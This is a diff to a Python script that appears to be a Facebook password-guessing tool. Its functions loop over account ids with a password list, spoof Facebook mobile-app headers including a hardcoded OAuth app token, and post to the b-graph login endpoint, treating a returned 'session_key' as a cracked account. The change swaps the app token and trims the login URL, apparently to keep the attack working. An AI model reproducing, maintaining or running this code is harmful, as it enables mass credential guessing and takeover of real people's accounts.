@@ -453,7 +453,7 @@ def api2(ids,names,passlist):
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-type':'unknown',
-                                        'Authorization':'OAuth 567067343352427|f249176f09e26ce54212b472dbab8fa8',
+                                        'Authorization':'OAuth 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',
                                         'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-bandwidth':str(random.randint(2e7, 3e7)),
@@ -532,7 +532,7 @@ def api3(ids,names,passlist):
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+                                url = 'https://b-graph.facebook.com/auth/login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
@@ -563,5 +563,4 @@ except requests.exceptions.ConnectionError:
         exit()
 except Exception as e:pass
 menu()
-
 
